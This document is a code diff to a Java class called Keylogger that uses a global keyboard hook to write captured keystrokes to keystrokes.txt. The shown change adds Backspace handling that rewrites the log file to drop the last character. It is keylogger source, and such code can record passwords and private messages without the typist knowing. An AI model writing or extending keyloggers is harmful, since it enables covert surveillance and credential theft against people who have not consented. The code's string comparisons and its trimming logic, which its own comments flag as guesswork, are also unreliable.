@@ -151,6 +151,33 @@ public class Keylogger implements NativeKeyListener {
             }
         }else if(pressedKey=="Shift"){
             fileMaker(writer,"");
+        }else if(pressedKey=="Back Space"){
+            try {
+                BufferedReader reader = new BufferedReader(new FileReader("keystrokes.txt"));
+
+                StringBuilder sb = new StringBuilder(); // no need of import 
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    sb.append(line);
+                    sb.append(System.lineSeparator());
+                }
+                String fileContent = sb.toString();
+
+                reader.close();
+
+                int lastLineStartIndex = fileContent.lastIndexOf(System.lineSeparator());
+                if (lastLineStartIndex != -1) {
+                    int lastLineEndIndex = fileContent.length() - 2; // it only works for -2 from the content to delete a last character
+                    fileContent = fileContent.substring(0, lastLineEndIndex - 1);
+                } // it takes more time to effect when you type fastly i think may be
+                BufferedWriter writer = new BufferedWriter(new FileWriter("keystrokes.txt"));
+                writer.write(fileContent);
+                writer.close();
+                System.out.println("BackSpaced");
+            }
+            catch (IOException e) {
+                System.out.println(e + "Exception Arised");
+            }
         }else {
 
             switch (nativeKeyEvent.getKeyCode()){
@@ -233,6 +260,7 @@ public class Keylogger implements NativeKeyListener {
                 case 50:
                     fileMaker(writer,"m");
                     break;
+                
             }
             }
 
